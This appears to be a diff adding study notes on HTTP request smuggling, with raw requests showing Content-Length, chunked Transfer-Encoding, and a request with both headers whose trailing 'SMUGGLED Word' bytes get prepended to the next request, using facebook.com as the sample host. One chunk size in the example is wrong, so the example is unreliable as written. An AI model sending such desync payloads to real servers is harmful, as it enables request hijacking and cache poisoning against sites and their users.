@@ -1,0 +1,71 @@
+
++++++ Content-length +++++++
+GET / HTTP/1.1 \r\n\
+Date: Mon 11 July.2020 \r\n\
+Host: facebook.com \r\n\
+Content-length:5 \r\n\
+Content-Type:text/plain \r\n\
+\r\n\
+Hello
+
++++++ Transfer-Encoding +++++++++
+GET / HTTP/1.1 \r\n\
+Date: Mon 11 July.2020 \r\n\
+Host: facebook.com \r\n\
+Transfer-Encoding:chunked \r\n\
+Content-Type:text/plain \r\n\
+\r\n\
+5 \r\n\
+Hello \r\n\
+6 \r\n\
+world \r\n\
+0 \r\n\
+\r\n\
+
+
+Request 1 =========
+GET / HTTP/1.1 \r\n\
+Host: facebook.com \r\n\
+Content-length:5 \r\n\
+Transfer-Encoding:chunked \r\n\
+Content-Type:text/plain \r\n\
+\r\n\
+5 \r\n\
+Hello \r\n\
+6 \r\n\
+world \r\n\
+0 \r\n\
+\r\n\
+SMUGGLED Word
+
+Request 2 =========
+GET / HTTP/1.1 \r\n\
+Host: facebook.com \r\n\
+Content-length:0 \r\n\
+
+
+When both request goes to server , in first request the server prefers T.E and not C.L.
+
+Request 1 at Server =============
+GET / HTTP/1.1 \r\n\
+Host: facebook.com \r\n\
+Content-length:5 \r\n\
+Transfer-Encoding:chunked \r\n\
+Content-Type:text/plain \r\n\
+\r\n\
+5 \r\n\
+Hello \r\n\
+6 \r\n\
+world \r\n\
+0 \r\n\
+\r\n\
+
+Request 2 at Server =============
+SMUGGLED WordGET / HTTP/1.1 \r\n\
+Host: facebook.com \r\n\
+Content-length:0 \r\n\
+
+
+
+
+
